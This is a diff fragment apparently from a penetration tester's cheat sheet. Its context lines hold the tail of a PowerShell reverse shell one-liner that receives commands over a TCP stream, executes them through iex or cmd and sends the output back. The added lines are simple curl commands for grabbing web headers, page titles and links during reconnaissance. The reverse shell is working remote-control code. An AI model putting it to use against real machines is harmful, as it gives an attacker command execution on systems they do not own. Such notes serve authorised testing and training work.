@@ -210,3 +210,9 @@ $item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item
 'cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+
 $data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + 
 '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
+
+curl -i iphere #get webserver headers using curl
+curl -i -L 10.11 #follow the redirect, if 302 on a request use this
+curl 10.11 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//' #quickly check the title tag (as that can have the web application name in it) as well as any links 
+curl 10.11 -s -L | html2text | uniq #use html2text instead of opening your web browser ;)
+
